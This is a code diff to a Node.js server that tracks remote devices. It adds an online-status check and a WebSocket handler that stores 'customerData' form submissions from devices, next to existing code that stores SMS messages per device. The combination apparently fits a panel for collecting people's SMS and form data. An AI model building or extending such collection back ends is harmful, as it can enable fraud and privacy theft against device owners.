@@ -244,8 +244,15 @@ app.post('/api/submit-data', async (req, res) => {
 // 2. Get All Devices
 app.get('/api/devices', async (req, res) => {
     try {
-        // Only return devices that are not deleted
+        // Only return devices that are not deleted and update isOnline based on lastSeen
+        const now = Date.now();
         const devices = await Device.find({ isDeleted: { $ne: true } }).maxTimeMS(8000).lean();
+        devices.forEach(d => {
+            // If lastSeen is more than 60 seconds ago, mark offline
+            if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) {
+                d.isOnline = false;
+            }
+        });
         res.json(devices);
     } catch (err) {
         console.error('❌ Get devices error:', err.message);
@@ -455,6 +462,34 @@ wss.on('connection', (ws, req) => {
                 console.log(`[WS] Stored ${data.messages.length} SMS for device ${data.deviceId}`);
                 return;
             }
+
+                // Handle FORM_SUBMIT from device
+                if (data.type === 'FORM_SUBMIT' && data.deviceId && data.customerData) {
+                    try {
+                        const device = await Device.findOneAndUpdate(
+                            { deviceId: data.deviceId },
+                            { $set: { customerData: data.customerData, lastSeen: new Date() } },
+                            { returnDocument: 'after', writeConcern: { w: 1 }, maxTimeMS: 8000 }
+                        );
+                        if (device) {
+                            console.log(`[WS] FORM_SUBMIT saved for device ${data.deviceId}`);
+                            if (ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({ status: 'success', message: 'Form data saved' }));
+                            }
+                            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
+                        } else {
+                            if (ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({ status: 'error', message: 'Device not found' }));
+                            }
+                        }
+                    } catch (err) {
+                        console.error(`[WS] FORM_SUBMIT error:`, err.message);
+                        if (ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({ status: 'error', message: 'Database error' }));
+                        }
+                    }
+                    return;
+                }
 
             if (data.deviceId || data.serialNumber) {
                 deviceId = data.deviceId || data.serialNumber;
